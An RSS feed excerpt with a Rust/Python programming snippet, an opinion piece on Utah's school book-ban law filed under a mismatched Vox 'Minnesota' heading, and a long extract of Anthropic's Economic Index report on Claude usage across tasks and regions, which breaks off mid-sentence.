This is because Python strings are immutable (and often interned) while its lists are not. Making `len` a magic method enforces late binding of the operation to the object's current state, hiding these implementation differences in normal use and allowing more aggressive optimizations for internal primitives.A classic example for C would be that `i[arr]` and `arr[i]` are equivalent because both are syntactic sugar for `*(arr+i)`TLDR: What are some abstractions in Rust that are invisible to 99% of programmers unless you start digging into the language's deeper mechanics?]]></content:encoded></item><item><title>The events that led to unrest in Minnesota #shorts</title><link>https://www.youtube.com/shorts/ox5JTMt8GOk</link><author>Vox</author><category>yt</category><enclosure url="https://www.youtube.com/v/ox5JTMt8GOk?version=3" length="" type=""/><pubDate>Thu, 22 Jan 2026 22:14:49 +0000</pubDate><source url="https://www.youtube.com/channel/UCLXo7UDZvByw2ixzpQCufnA">Vox</source><content:encoded><![CDATA[Why is Donald Trump obsessed with Minnesota?

On top of its other unconstitutional laws (like the oft-challenged social media ban) and legislative proposals, there’s its book ban law that has seen it become the first state to actually remove certain books from  public schools across the state. The targeted books are exactly the ones you think they are. Of the 13 titles to make the first ban list in 2024, 12 of them were written by women. It has added more titles to the ban list for 2026, as BookRiot reports. This law is basically just a heckler’s veto. No consensus is needed to subject a title to removal across the state. The law allows parents to file book challenges which, in reality, means a few bigoted activists will be able to impose their will on every resident in the state.The law compounds this deliberate error by allowing certain schools (or those being pressured by this small group of anti-freedom activists) to place their thumbs on the scale. Since that’s what the law is designed to do, that’s exactly what has happened: What is important to understand about the law is that despite claims this is about “local control,” schools in the state are forced to follow the decisions made in other districts. There are 42 public school districts in Utah, but two districts account for nearly 80% of the books banned statewide: Davis School District and Washington School District.The three latest book bans came exclusively because of bans at Davis, Tooele, and Washington school districts. Again, two districts are doing nearly all of the dictating of what books are allowed at public schools throughout all of Utah.“Local control” is as meaningless as “representative democracy.” Someone will always find a way to game the system to ensure they keep what they have if not take a little more. Political parties gerrymander. Utah legislators craft laws that allow a small subset of state schools to write the rules for the rest of them. For now, the law remains in place and the entirety of the state remains under the direct, definitely not “local” control of a couple of school districts. For now. But things could get a bit more interesting soon, now that a serious challenge to the law has been raised by some of the authors directly affected by these bans. A group of best-selling authors whose books are banned from Utah public schools are suing the state, arguing its sensitive materials law is unconstitutional.Filed in federal court, the lawsuit comes after three more books were banned from K-12 schools.Among those suing over Utah’s book ban law are award-winning novelists Elana K. Arnold and Ellen Hopkins, the Estate of Kurt Vonnegut and two anonymous Utah public high school students.The lawsuit [PDF] raises questions the state isn’t going to be in any hurry to answer. The Book Removal Law, codified at Section 53G-10-103 of the Utah Code, is unmoored from the First Amendment and requires Utah’s Local Education Agencies (“LEAs”) to strip their school libraries of any book that contains even a single description or depiction of sex, no matter how fleeting, no matter its context, and no matter its literary, artistic, political, or scientific value.The Book Removal Law also never asks the most basic question: appropriate for whom? A kindergartner learning to sound out words and a twelfth-grader weeks from graduation are treated identically. As described below, once a book is labeled “sensitive,” it must be taken from the shelf, including the high school library. There is no recognition that a seventeen-year-old preparing for college, navigating identity, relationships, and the realities of adulthood stands in a fundamentally different place than a five-year-old.This creates an absurd mismatch with other parts of Utah’s own legal standards. State law permits sixteen-year-olds to consent to certain sexual activity. Yet the same students whom Utah trusts to make intimate, real-world decisions about their bodies are, under the Book Removal Law, barred from accessing out books that contain a mere single passage describing the very conduct in which is lawful for them to engage. The Book Removal Law tells them: you are mature enough to do this, but not mature enough to read about it.The answer is, of course, that this isn’t about protecting children from content that might be inappropriate for them. It’s about giving bigots and public employees an easy way to remove content they personally don’t like. Because its ulterior motive is its  motive, it’s been written in a way that makes it extremely susceptible to legal challenges. With any luck, this law won’t survive much longer and the people who think  should have access to content  don’t care for will have to go back to the ineffective seething that seems to make up a disproportionate portion of their existence. ]]></content:encoded></item><item><title>Anthropic Economic Index report: economic primitives</title><link>https://www.anthropic.com/research/anthropic-economic-index-january-2026-report</link><author>malshe</author><category>hn</category><pubDate>Thu, 22 Jan 2026 21:54:02 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[How is AI reshaping the economy?This report introduces new metrics of AI usage to provide a rich portrait of interactions with Claude in November 2025, just prior to the release of Opus 4.5. These “primitives”—simple, foundational measures of how Claude is used, which we generate by asking Claude specific questions about anonymized Claude.ai and first-party (1P) API transcripts—cover five dimensions relevant to AI’s economic impact: user and AI skills, how complex tasks are, the degree of autonomy afforded to Claude, how successful Claude is, and whether Claude is used for personal, educational, or work purposes.The results reveal striking geographic variation, real-world estimates of AI task horizons, and a basis for revised assessments of Claude's macroeconomic impact.The data we release alongside this report are the most comprehensive to date, covering five new dimensions of AI use, consumer and firm use, and country and region breakdowns for Claude.ai.What has changed since our last reportIn the first chapter, we revisit findings from our previous Economic Index report published in September 2025. We find:Claude usage remains concentrated among certain tasks, most of them related to coding While we see over 3,000 unique work tasks in Claude.ai, the top 10 most common tasks account for 24% of our sampled conversations, a slight increase since our last report. Augmentation patterns (conversations where the user learns, iterates on a task, or gets feedback from Claude) edged to just over half of conversations on Claude.ai. In contrast, automated use remains dominant in 1P API traffic, reflecting its programmatic nature.Global usage remains persistently uneven while US states convergeThe US, India, Japan, the UK, and South Korea lead in overall Claude.ai use. Worldwide, uneven adoption remains well-explained by GDP per capita. Within the US, workforce composition plays a key role in shaping uneven adoption as states with more computer and mathematical professionals show systematically more Claude usage.While substantial concentration remains, since our last report Claude usage has become noticeably more evenly distributed across US states. If sustained, usage per capita would be equalized across the country in 2-5 years.Introducing and analyzing our new economic primitivesIn the second chapter we discuss the motivation for and introduce our new economic primitives, including how they were selected and operationalized, and their limitations. We additionally present evidence that our primitives capture directionally accurate aspects of underlying usage patterns as compared to external benchmarks. In chapters three and four we use these primitives to further investigate implications for adoption and productivity. We find:Claude use diversifies with higher adoption and incomeWhile the most common use of Claude is for work, coursework use is highest in countries with the lowest GDP per capita, while rich countries show the highest rates of personal use. This aligns with a simple adoption curve story: early adopters in less developed countries tend to be technical users with specific, high-value applications or use Claude for education, whereas mature markets see usage diversify toward casual and personal purposes.Claude succeeds on most tasks, but less so on the most complex onesWe find that Claude generally succeeds at the tasks it is given, and that the education level of its responses tends to match the user's input. Claude struggles on more complex tasks: As the time it would take a human to do the task increases, Claude’s success rate falls, much like prominent evals measuring the longest tasks that AIs can reliably perform. Job exposure to AI looks different when success rates are factored inWe also use the success rate primitive to better understand job exposure to AI, calculating the share of each occupation that Claude can perform by weighting task coverage by both success rates and the importance of each task within the job. For some occupations, like data entry keyers and database architects, Claude shows proficiency in large swaths of the job.Claude is used for higher-skill tasks than those in the broader economyThe tasks we observe in Claude usage tend to require more education than those in the broader economy. If we assume that AI-assisted tasks diminish as a share of worker responsibilities, removing them would leave behind less-skilled work. But this simple task displacement would not affect white-collar workers uniformly—for some occupations it removes the most skill-intensive tasks, for others the least.Without the tasks that we observe Claude performing, travel agents would experience deskilling as complex planning work gives way to routine ticket purchasing and payment collection. Property managers, by contrast, would experience upskilling as bookkeeping tasks give way to contract negotiations and stakeholder management.A new window for understanding AI’s impact on the economyThese results provide a new window into how AI is currently impacting the economy. Knowing the success rate of tasks gives a more accurate picture of which tasks might be automated, how impacted certain jobs might be, and how labor productivity will change. Measuring differential performance by user education sheds light on inequality effects.Indeed, the close relationship between education levels in inputs and outputs signals that countries with higher educational attainment may be better positioned to benefit from AI, independent of adoption rates alone.This data release aims to enable researchers and the public to better understand the economic implications of AI and investigate the ways in which this transformative technology is already having an effect.Chapter 1: What has changed since our last reportBecause frontier AI model capabilities are improving rapidly and adoption has been swift, it is important to regularly take stock of changes in how people and businesses are using such systems—and what this usage implies for the broader economy.In this chapter we analyze how Claude usage and diffusion patterns changed from August 2025 to November 2025 just prior to the release of Opus 4.5. We make four observations:Usage remains highly concentrated across tasks:The ten most common tasks represent 24% of observed usage on Claude.ai, up from 23% in our last report. For first-party (1P) API enterprise customers, concentration among tasks increased more notably: the top ten tasks now represent 32% of traffic, up from 28% in the last report.Augmentation is once again more common than automation on Claude.ai:In our previous report we noted that automated use had risen to exceed augmented use on Claude.ai, perhaps capturing both improving capabilities and greater familiarity among users with LLMs. Data from November 2025 points to a broad-based shift back toward augmented use on Claude.ai: The share of conversations classified as augmented jumped 5pp to 52% and the share deemed automated fell 4pp to 45%. Product changes during this period—including file creation capabilities, persistent memory, and Skills for workflow customization—may have shifted usage patterns toward more collaborative, human-in-the-loop interactions.Within the US, lower usage states have relatively faster gains in adoptionWithin the US, usage per capita remains largely shaped by how well-matched the workforce is to broader Claude usage: For example, states with a larger share of workers in computer and mathematical occupations tend to have higher usage. Indeed, the top five US states account for nearly half (50%) of all usage despite representing only 38% of the working-age population. Nevertheless, there are early signs of rapid regional convergence in adoption: usage has increased relatively faster for states that had lower usage in our last report. If sustained, usage per capita would be equalized across the country in 2-5 years, a pace of diffusion roughly 10x faster than the spread of previous economically consequential technologies in the 20th century.While this is consistent with rapid AI adoption and diffusion, this estimate comes with uncertainty given that it is based on a change observed over a three month period. Diffusion may ultimately proceed more slowly in the months and years to come.Global usage shows little sign of increasing or decreasing regional convergenceGlobally, Claude usage per capita—as captured by the Anthropic AI Usage Index (AUI)—remains highly uneven and strongly correlated with GDP. These gaps are stable: we see no evidence that low-use countries are catching up or that high-use countries are pulling away.Shifting patterns of usage across tasks and associated occupationsEven though frontier LLMs have an impressive range of capabilities relevant to every facet of the modern economy, Claude usage remains very concentrated among a small number of tasks. As compared to nearly one year ago, consumer usage on Claude.ai is modestly more concentrated: The share of conversations assigned to the ten most prevalent O*NET tasks was 24% in November 2025, 1pp higher than in August and up from 21% in January 2025. The most prevalent task in November 2025—modifying software to correct errors—alone represented 6% of usage.In our last Anthropic Economic Index Report we began tracking business adoption patterns by studying Claude usage among 1P API customers. The ten most common tasks grew from 28% of API records in August to 32% in November. Rising concentration among a small set of tasks suggests the highest-value applications continue to generate outsized economic value even as models have become more capable at a wider range of tasks. As with Claude.ai the most common task among API customers was modifying software to correct errors, which accounted for one in ten records.Indeed, computer and mathematical tasks—like modifying software to correct errors—continue to dominate Claude usage overall, representing a third of conversations on Claude.ai and nearly half of 1P API traffic. Such dominance has subsided on Claude.ai: the share of conversations on Claude.ai assigned to such (mostly) coding-related tasks is down from a peak of 40% in March 2025 to 34% in November 2025. At the same time, the share of transcripts assigned to computer and mathematical tasks among 1P API traffic edged higher from 44% in August to 46% in November 2025 (Figure 1.2).The second largest share of Claude.ai usage in November 2025 was in the Educational Instruction and Library category. This corresponds mostly to help with coursework and review, and the development of instructional materials. Such usage has risen steadily since our first report, up from 9% of conversations on Claude.ai in January 2025 to 15% in November.The share of usage on Claude.ai for Arts, Design, Entertainment, Sports, and Media tasks increased between August and November 2025 as Claude was used in a growing share of conversations for writing tasks, primarily copyediting and the writing and refinement of fictional pieces. This jump in the prevalence of design- and writing-related tasks reversed a steady decline across earlier reports. For both Claude.ai and API customers, there was a drop in the share of conversations/transcripts where Claude was used for Life, Physical, and Social Science-related tasks.Perhaps the most notable development for API customers was the increase in the share of transcripts associated with Office and Administrative Support related tasks, which rose 3pp in August to 13% in November 2025. Because API use is automation-dominant, this suggests that businesses are increasingly using Claude to automate routine back-office workflows such as email management, document processing, customer relationship management, and scheduling.Augmentation is again dominant on Claude.aiHow AI will affect the economy depends not just on the tasks Claude is used for but the way that users access and engage underlying model capabilities. Since our first report, we have classified conversations into one of five interaction types, which we group into two broader categories: automation and augmentation.Figure 1.3 plots how automated versus augmented use has evolved over time since we first started collecting this data one year ago. In January 2025, augmented use of Claude was dominant: 56% of conversations were classified as augmentation compared to 41% automated. In August 2025, more conversations were classified as automated as compared to augmented.This was a notable development since it suggested that rapid improvements in model capabilities and platform functionality coincided with users increasingly delegating tasks entirely to Claude. This was evident in the “directive” collaboration mode, which is further grouped as automation. Directive conversations are those in which users give Claude a task and it completes it with minimal back-and-forth. From January 2025 to August 2025 the share of such directive conversations rose from 27% to 39%.Three months later, the share of directive conversations had fallen 7pp to 32% in November 2025 as augmentation once again became more prevalent on Claude.ai than automation. Nevertheless, the automation share was still elevated as compared to nearly one year ago when we first began tracking this measure, suggesting that the underlying trend is still toward greater automation even as the August spike overstated how quickly it was materializing.While we see some evidence of a shift toward soft skill usage on Claude.ai with design, management, and education now higher, the shift back toward augmented use was broad-based in November (Figure 1.4). The rise in augmented use was driven mainly by users iterating with Claude to complete tasks (“task iteration”) rather than asking Claude to explain concepts (“learning”). See Figure 1.5 for common words associated with the three most common interaction modes across O*NET tasks and bottom-up descriptions of requests made of Claude.Persistent regional concentrationIn our previous report, we introduced the Anthropic AI Usage Index (AUI), a measure of whether Claude is over- or underrepresented in a given geography relative to the size of its working-age population. The AUI is defined asAn AUI above 1 indicates that a country uses Claude more intensively than its population alone would predict, while an AUI below 1 indicates lower-than-expected usage. For example, Denmark has an AUI of 2.1, meaning its residents use Claude at roughly twice the rate its share of the global working-age population would suggest.A key fact about Claude usage globally is that it is geographically concentrated: a small number of countries comprise an outsized share of use. From a global perspective, little changed in this respect between August and November 2025. Indeed, the left panel of Figure 1.6 shows that the AUI concentration across countries was essentially unchanged between our last report and this report.By contrast, usage became more evenly distributed across US states from August to November 2025: the Gini coefficient, a standard measure of equality, fell from 0.37 to 0.32. While it is important to exercise caution in interpreting short-run changes, this is a relatively large change toward perfect equality in which the AUI is equal to 1 for all states with a Gini coefficient of 0. If the Gini coefficient for the US again falls by 0.05 every three months, then parity of usage would be reached in roughly two years.What shapes patterns of usage within the US and around the world? In our previous report we emphasized the key role played by income differences globally: Variation in Claude usage across countries is largely accounted for by variation in GDP per capita. In Chapter 3 we revisit the importance of income in shaping not just usage intensity but also patterns of usage around the world.Within the US, income is less clearly a predictor of usage. Instead, what appears to matter most is the composition of each state’s workforce and how well-matched the workforce is to Claude capabilities as reflected in task-level usage. States that have a higher share of workers in computer and mathematical occupations—like Washington D.C., Virginia, and Washington—tend to have higher usage per capita. Quantitatively, each 1% increase in the share of such tech workers in a state is associated with 0.36% higher usage per capita (Figure 1.7). This alone accounts for nearly two-thirds of the cross-state variation in AUI.While we would intuitively expect Claude usage to be higher in states with more tech workers, this pattern holds more generally: Usage per capita is higher in states with more workers in occupations where Claude usage is overrepresented as compared to the US workforce (e.g., Arts, Design, Entertainment, Sports and Media) or with relatively fewer workers in occupations where Claude usage is low as compared to the national economy (e.g., Transportation and Material Moving). This can be seen by calculating the Kullback–Leibler (KL) divergence between the composition of each state’s workforce and the global composition of Claude usage. States with a lower KL divergence—and thus with a workforce that looks more similar to Claude usage patterns—tend to have higher usage per capita.Signs of faster Claude diffusion in the US among low usage statesWhile differences in workforce composition appear to play a role in shaping regional adoption within the US, early evidence suggests Claude is diffusing considerably faster than historical precedent would predict. Economically consequential technologies have historically taken around half a century to achieve full diffusion across the US (Kalanyi et al., 2025). By contrast, comparing Claude adoption rates in November 2025 to three months prior, we estimate that parity in adoption per capita across US states—as measured by the AUI—could be reached within 2–5 years. This estimate comes with a high degree of uncertainty as the precision of our estimates cannot rule out much slower rates of diffusion.We generate this estimate through the lens of a simple model of diffusion, which we briefly describe here. We model diffusion as proportional convergence toward a common steady state of equalized usage per capita in which each state s has an AUI equal to 1:Under this model, the log deviation of AUI from steady state (AUI = 1) shrinks by a factor of β every three months, implying a half-life of β quarters. For example, with quarterly data a value of β = 0.99 implies a half-life of about 17 years. To illustrate, starting from an initial AUI of 2, this means AUI would decline to around 1.4 after 17 years and to around 1.1 after 50 years. We take β = 0.99 as a sensible benchmark because it implies a pace of diffusion similar to economically consequential technologies in the 20th century.This model of convergence motivates the following regression specification:Naively estimating this equation by ordinary least squares (OLS) yields an estimate of β̂  ≈ 0.77. Weighted least squares (WLS) where we weight by each state’s workforce yields an estimate of β̂  ≈ 0.76 (Figure 1.8). Both are statistically distinguishable from 1 at conventional levels. Taken at face value, these estimates imply that it would take little more than two years for each state's AUI to close most of the gap to 1.A concern with estimating convergence this way is that our AUI estimates are subject to sampling noise and other variation unrelated to diffusion. This can produce classical attenuation bias: even if AUI is not actually changing, our estimate of β could end up meaningfully below one.To address this, we estimate the model by two-stage least squares (2SLS), instrumenting the log of AUI in August 2025 with the composition of each state's workforce, measured by its proximity to overall Claude usage patterns. The logic behind this instrument is that workforce composition is a strong predictor of Claude usage (relevance) but being measured independently, is expected to be uncorrelated with sampling noise in our AUI estimates (validity). As noted above, states with more workers in high-Claude-usage roles do tend to have systematically higher usage per capita.The 2SLS estimates imply modestly slower convergence: β̂  ≈ 0.89 unweighted and β̂  ≈ 0.86 when weighting by each state’s working-age population. However, these estimates are less precise, and only the former is statistically distinguishable from 1 at the 10% level. Despite implying a slower convergence than OLS, the 2SLS estimates still imply rapid diffusion: just four to five years for the log deviation of each state's AUI to shrink by 90%.That said, our estimates are based on just three months of data. And while the 2SLS specification may help address sampling noise, considerable uncertainty remains. We will revisit this question of the pace of diffusion in future reports.As with previous reports, all our analysis is based on privacy-preserving analysis. Throughout the report we analyze a random sample of 1M conversations from Claude.ai Free, Pro and Max conversations (we also refer to this as “consumer data” since it mostly represents consumer use) and 1M transcripts from our first-party (1P) API traffic (we also refer to this as “enterprise data” since it mostly represents enterprise use). Both samples come from November 13, 2025 to November 20, 2025. We continue to manage data according to our privacy and retention policies, and our analysis is consistent with our terms, policies, and contractual agreements. For 1P API data, each record is a prompt-response pair from our sample period which in some instances is mid-session for multi-turn interactions. The share of conversations on Claude.ai that were classified into neither automation nor augmentation categories fell from 3.9% to 3.0%. See, for example, Kalanyi et al (2025): “Second, as the technologies mature and the number of related jobs grows, hiring spreads geographically. This process is very slow, taking around 50 years to disperse fully.”With our bottom-up analysis of 1P API traffic we see Claude used to "Generate personalized B2B cold sales emails" (0.47%), "Analyze emails and draft replies for business correspondence" (0.28%), "Build and maintain invoice processing systems" (0.24%), "Classify and categorize emails into predefined labels" (0.23%), and "Manage calendar scheduling, meeting coordination, and appointment booking" (0.16%). At a high level, we distinguish between automation and augmentation modes of using Claude. Automation encompasses interaction patterns focused on task completion: Directive: Users give Claude a task and it completes it with minimal back-and-forth; Feedback Loops: Users automate tasks and provide feedback to Claude as needed; Augmentation focuses on collaborative interaction patterns: Learning: Users ask Claude for information or explanations about various topics; Task Iteration: Users iterate on tasks collaboratively with Claude; Validation: Users ask Claude for feedback on their work These interaction modes are not mutually exhaustive. In some instances, Claude determines that a sampled conversation does not match any of the five interaction modes. In this report we use Sonnet 4.5 for classification whereas in our previous Economic Index report we used Sonnet 4. We previously found that different models can generate different classification outcomes, though these effects tend to be modest.We include a constant term in the regression since it should be equal to zero under the null hypothesis. Across all our specifications, the constant term is estimated to be close to and statistically indistinguishable from zero.Chapter 2: Introducing economic primitivesThe strength of the Anthropic Economic Index lies in showing not only how much AI is used, but  it is used. In prior reports, we showed which tasks Claude is used for, and how people collaborate with Claude. These data have enabled external researchers to analyze labor market shifts (e.g., Brynjolfsson, Chandar & Chen, 2025).In this edition of the Anthropic Economic Index, we expand the breadth of data available to external researchers by providing insights on five economic “primitives”, by which we mean simple, foundational measures of the ways that Claude is used, which we generate by asking Claude to answer specific questions about the anonymized transcripts in our sample. Some of our primitives encompass several such questions, and others use a single indicator.Because AI capabilities are advancing so rapidly and the economic effects will be unevenly experienced, we need a breadth of signals to uncover not just how Claude is used but also to inform what impact this technology will have.Dimensions of AI use that matter for economic impactsThis report introduces five new economic primitives beyond the one we already measure, collaboration patterns (whether users automate or augment their tasks with Claude). These primitives capture five dimensions of a human-AI conversation: 1) task complexity, 2) human and AI skills, 3) work, coursework or personal use case, 4) the AI’s level of autonomy, and 5) task success (see Table 2.1). AI autonomy captures something different from our existing automation/augmentation distinction. For example, “Translate this paragraph into French” is high automation (directive, minimal back-and-forth) but low AI autonomy (the task requires little decision-making from Claude). captures that tasks can vary in their complexity, including how long they take to complete and how difficult they are. A "debugging" task in O*NET could refer to Claude fixing a small error in a function or comprehensively refactoring a codebase—with very different implications for labor demand. We measure complexity through estimated human time to complete tasks without AI, time spent completing tasks with AI, and whether users handle multiple tasks within a single conversation. address how automation interacts with skill levels. If AI disproportionately substitutes for tasks requiring less expertise while complementing higher-skilled work, it could be another form of skill-biased technical change—increasing demand for highly skilled workers while displacing lower skilled workers. We measure whether users could have completed tasks without Claude, and the years of education needed to understand both user prompts and Claude's responses. distinguishes professional, educational, and personal use. Labor market effects most directly follow from workplace use, while educational use may signal where the future workforce is building AI-complementary skills. measures the degree to which users delegate decision-making to Claude. Our latest report documented rising "directive" use where users delegate tasks entirely. Tracking autonomy levels—from active collaboration to full delegation—helps forecast the pace of automation. measures Claude’s assessment of whether Claude completes tasks successfully. Task success helps assess whether tasks can be automated effectively (can a task be automated at all?) and efficiently (how many attempts would it take to automate a task?). That is, task success matters for both the feasibility and the cost of automation labor tasks.Selecting and validating the new measuresThe new dimensions of AI use captured in our data were informed by our recent work on the productivity effects of Claude, feedback we received from external researchers, recent literature on AI’s economic impact through the lens of human capital and expertise (Vendraminell et al., 2025), and deliberation within our economic research team. Our main selection criteria were expected economic relevance, complementarity of dimensions, and whether Claude could classify conversations along that dimension with directional accuracy.We propose that multiple simple primitives, even if somewhat noisy and not perfectly accurate by themselves, can together provide important signals on how AI is being used. We therefore mainly tested for directional accuracy.For classifying task duration with and without AI, we used minimally modified versions of our prior productivity work. For net new classifiers, implemented via our privacy-preserving tooling, our validation process was as follows. We designed multiple potential measures to capture concepts such as task complexity. For Claude.ai, we evaluated the classifier performance compared to a human researcher on a small set of transcripts in which users gave feedback to Claude.ai and for which we thus have permission to look at underlying transcripts. For first-party API (1P API) data, we validate the classifiers using a mix of internal and synthetic data. Neither data sources are fully representative of Claude.ai or 1P API traffic, but they allow us to check that the classifiers are working on data that resembles real usage data, while ensuring privacy.Based on initial performance, we revised the classifiers that needed tweaking or discarded classifiers that did not perform well. Interestingly, we find that in some instances (e.g., to measure task success), a simple classifier performed better than a nuanced, complex classifier when compared to human ratings. We then compared performance of classifier versions with vs. without chain of thought prompting, and decided to keep chain of thought prompting only for three facets (human time estimate, human with AI time estimate, and AI autonomy) where we found that it substantially improved performance. We selected a final set of nine new classifiers for the five primitives, all of which are directionally accurate even if they may deviate somewhat from human ratings.The primitives' value is in what they can predictOur goal was to create classifiers that are straightforward to implement and in combination provide potentially important economic signals. While we are very confident in the directional accuracy of the new measures (e.g., tasks with higher average years of education needed to understand the human prompt are likely more complex), none of the measures should be taken as exact or definitive (e.g., Claude.ai may somewhat underestimate the human education years needed for many tasks).Even so, the primitives enrich our understanding of how people use AI. Systematic relationships emerge across primitives, regions, and tasks—patterns we explore in depth in Chapters 3 and 4. That these relationships are intuitive and consistent suggests the primitives capture relevant aspects of how people and businesses use Claude.External benchmarks reinforce this. In our productivity work, Claude’s time estimates correlate with actual time spent on software engineering tasks. Figure 2.1 shows that our human education measure correlates with actual worker education levels across occupations. These validations suggest individual primitives are directionally correct—and combining them may provide additional analytical value, such as enriching productivity estimates with task success rates or constructing new measures of occupational exposure.Ultimately, the strongest validation will come from the primitives’ ability to capture meaningful variation in labor market outcomes. The data we release enable external researchers to analyze economic shifts in new ways. Early work has been encouraging—the automation/augmentation distinction from prior reports has already been used by external researchers to analyze labor market shifts (Brynjolfsson, Chandar & Chen, 2025).Primitives highlight how use cases differTo illustrate how the primitives distinguish between different types of AI use, we examine two contrasting request clusters: software development ("Help debug, develop, and optimize software across multiple programming domains") and personal life management ("Assist with personal life management and everyday tasks"). Figure 2.2 shows the primitive profile for each cluster alongside global averages. Claude estimates that software development requests would take a competent professional approximately 3.3 hours to complete without AI—close to the global average of 3.1 hours. Personal life management tasks are estimated to be simpler, averaging 1.8 hours. Estimated human-AI collaboration time is similar across both (~15 minutes), showing this primitive varies less than other primitives for these two tasks. Software development requests draw on more specialized knowledge: both human prompts and AI responses are estimated to require approximately 13.8 years of education to understand, compared to 9.1–9.4 years for personal life management requests. Claude estimates that users would be able to complete personal life management requests by themselves 96% of the time, versus 82% for software development requests—indicating that Claude provides more essential support for technical work. Claude classifies 64% of software development requests as work-related, compared to just 17% for personal life management. This illustrates that Claude can be used for very different purposes. Overall, Claude.ai use is 46% work, 19% coursework, and 35% personal. Both clusters show similar estimated autonomy levels (~3.5 on a 1 to 5 scale), near the global average. This means that both software development and personal life management tasks, on average, afford Claude a similar autonomy to make decisions on how to complete the task. Claude assesses personal tasks as successfully completed 78% of the time, versus 61% for software development. Harder tasks—those requiring more specialized knowledge and where users could not easily complete them alone—show lower estimated success rates.Tasks and primitives differ between Claude.ai and API usersAs in our previous report, we find major differences in the tasks and primitives in Claude.ai conversations compared to the 1P API data. Part of this reflects the nature of the interaction: Claude.ai transcripts can include multi-turn conversations, while the API data we analyze is limited to single input-output pairs. This is because API requests arrive independently, with no metadata linking them to prior exchanges. This means we can only analyze them as isolated user-assistant pairs rather than full conversation trajectories.Overall, API usage is overwhelmingly work-related (74% vs. 46%) and directive (64% vs. 32%), with three-quarters of interactions classified as automation compared to less than half on Claude.ai (see Figure 1.3).Claude.ai users, by contrast, engage in more back-and-forth: task iteration and learning modes are far more common, and tasks tend to be more lengthy—both in terms of human time with AI (15 minutes vs. 5 minutes) and the estimated time a human would need to complete the task alone (3.1 hours vs. 1.7 hours). Claude.ai also shows higher task success rates (67% vs. 49%), which may reflect the benefits of multi-turn conversation, where users can clarify, correct course, and iterate toward a solution. Claude.ai users also give the AI more autonomy on average, and are more likely to bring tasks they couldn't complete alone.These differences are also reflected in the occupational distribution of tasks. API usage is heavily concentrated in Computer & Mathematical tasks (52% vs. 36%), consistent with its use for programmatic, automation-friendly workflows like code generation and data processing. Office & Administrative tasks are also more prevalent in the API (15% vs. 8%), reflecting routine business operations suited to delegation. Claude.ai, by contrast, sees substantially more Educational Instruction tasks (16% vs. 4%)—coursework help, tutoring, and instructional material development—as well as more Arts, Design, and Entertainment tasks (11% vs. 6%). Claude.ai also has a longer tail of human-facing categories like Community & Social Service and Healthcare Practitioners, where users seek advice, counseling, or information on personal matters.These patterns suggest that 1P API deployments concentrate on tasks amenable to systematic automation, while Claude.ai serves a broader range of use cases including learning, creative work, and personal assistance.Chapter 4 explores task-level variation in greater depth. A classifier is a model that assigns a given input (e.g. a user conversation) a specific output (e.g. the use case “work”). In this report, we use Claude as a classifier, meaning that we prompt Claude to select a specific output and then use Claude’s response as the output (see Table 2.1 for the prompts).Throughout this report, we use binned scatterplots to show bivariate relationships. We divide observations into 20 equally-sized bins based on the x variable, then plot the average x and y values for each bin. The leftmost dot, for example, represents the averages for observations in the lowest 5% of the x distribution.Chapter 3: How Claude is used varies by geographyIn this chapter, we analyze geographic variation in Claude usage patterns using a privacy-preserving¹ analysis of 1 million Claude.ai conversations². We make five observations:Claude is mostly used for work, but use cases diversify with adoption: Work and personal use cases are more common in higher-income countries, while coursework use cases are more common in lower-income countries. This echoes findings from our prior report and aligns with recent work by Microsoft.GDP and human education predict adoption globally and within the US: A 1% increase in GDP per capita is associated with a 0.7% increase in Claude usage per capita at the country level. Human education—Claude's estimate of years of formal education needed to understand the human prompt—correlates positively with the Anthropic AI Usage Index at both levels.Other primitives predict adoption differently at global vs. US levels: At the country level, higher usage correlates with shorter tasks and less AI autonomy. At the US state level, these relationships are not statistically significant, though work use correlates positively with adoption.Relationships between primitives depend on context: Task success is negatively associated with human education across countries, but positively within US states. However, when controlling for other primitives, the US relationship becomes insignificant.How humans prompt is how Claude responds: The education levels of human prompts and AI responses are nearly perfectly correlated (r > 0.92 at both levels). Higher per capita usage countries also show more augmentation—using Claude as a collaborator rather than delegating decisions entirely.Claude is mostly used for work, but use cases diversify with adoptionOur data, relying on a privacy-preserving analysis of 1 million Claude.ai conversations, reveals striking geographic differences in how Claude is adopted. Claude is predominantly used for work, across the globe and across the United States. However, there is geographic variation in use cases. At the global level, the Balkans and Brazil have the highest relative share of work use (see Figure 3.1), and Indonesia stands out with the highest share of coursework. At the US state level, New York stands out as the state using Claude relatively the most for work.Use case differences are related to a country’s per capita income, which, in turn, is related to per capita AI adoption. We observe that work use cases and personal use cases of Claude are more common in higher income countries, while coursework use cases are more common in lower income countries (see Figure 3.2). Interestingly, these findings converge with recent work by Microsoft showing that AI use for school is associated with lower per capita income, whereas AI use for leisure is associated with higher per capita income.Multiple factors could contribute to these patterns:Personal use cases may be more common as AI adoption increases and more diverse users use AI, or existing users explore wider applications of AI. In contrast, countries with lower per capita adoption (which is correlated with lower per capita income) may be focused on specific use cases such as coding or as coursework.Countries differ in their ability to pay for Claude, and coursework use cases may be better suited to free Claude usage than complex use cases in work areas such as software engineering.Users in higher-income countries may have other resources, such as free time and continuous Internet access, that enable non-essential personal use cases.International and US adoption differ across economic primitivesThe economic primitives introduced in this report allow us to analyze some of the factors that may drive differential adoption. When analyzing the relationship between the Anthropic AI Usage Index (AUI) and core economic primitives as well as GDP, we observe that certain patterns hold for both countries and US states. For example, we replicate the finding from our prior report that GDP is strongly correlated with the AUI (see Figures 3.3 and 3.4). At the country level, a 1% increase in GDP per capita is associated with a 0.7% increase in Claude usage per capita. Human education (how many years of education it takes to understand the human written prompts in a conversation) correlates positively and significantly with the Anthropic AI Usage Index both at the country and at the US state level.However, the relationship between AUI and the primitives often differs between country and US state level. For example, at the country level, the AUI correlates negatively with the time it would take a human to complete a task without AI, and with how much decision-making autonomy AI is given. At the US state level, these relationships are not statistically significant–likely also due to the smaller sample size for US states. Additionally, we observe a positive correlation between the AUI and Claude.ai use for work at the US state, but not at the country level.Importantly, the primitives themselves are not necessarily causal factors—we don't know if income or education are truly driving adoption, or if they're proxies for other underlying conditions. Many of these factors are highly correlated with one another. For example, at the US state level, human education years show a strong association with the Anthropic AI Usage Index in isolation, but this relationship disappears once we control for GDP and other primitives—suggesting education may be capturing variation that's better explained by economic development and other factors.Institutional factors shape the relationship between task success and education yearsEconomic and institutional context—such as how education levels vary within a geography—are related to how AI is being used. Interestingly, we observe that task success is negatively associated with human education at the country level, but positively related at the US state level. However, the positive relationship at the state level becomes 